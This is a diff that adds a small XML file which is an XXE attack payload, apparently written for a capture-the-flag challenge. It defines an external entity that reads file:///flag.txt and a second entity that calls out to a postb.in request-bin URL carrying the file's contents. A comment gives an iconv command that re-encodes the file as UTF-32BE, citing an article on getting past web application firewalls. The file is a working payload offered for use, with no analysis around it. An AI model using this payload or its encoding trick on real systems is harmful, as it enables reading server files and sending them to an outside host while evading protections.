@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE users [
+<!ENTITY flag SYSTEM "file:///flag.txt">
+<!ENTITY callhome SYSTEM "https://postb.in/1568413116202-4962478391826/?%flag;">
+]>
+<users>
+<user><intro>&flag;</intro></user></users>
+
+<!-- cat upload.xml | iconv -f utf-8 -t utf-32be > encoded.xml -->
+<!-- https://lab.wallarm.com/xxe-that-can-bypass-waf-protection-98f679452ce0 -->
+
